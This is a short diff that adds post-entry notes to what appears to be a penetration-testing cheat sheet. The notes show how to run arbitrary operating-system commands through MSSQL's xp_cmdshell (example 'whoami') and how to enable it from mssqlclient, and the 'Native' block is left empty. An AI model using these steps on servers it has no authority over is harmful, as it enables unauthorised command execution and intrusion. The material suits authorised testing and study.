@@ -29,7 +29,20 @@ exploit
 
 Post Entry:
 
+We can use xp_cmdshell to execute arbitrary command:
+```
+xp_cmdshell '<command>'
+#Example
+xp_cmdshell 'whoami'
+```
 
+If it is not enabled, we can also enable it:
+```
+#In msssqlclient:
+enable xp_cmdshell
+#Native:
+
+```
 
 
 
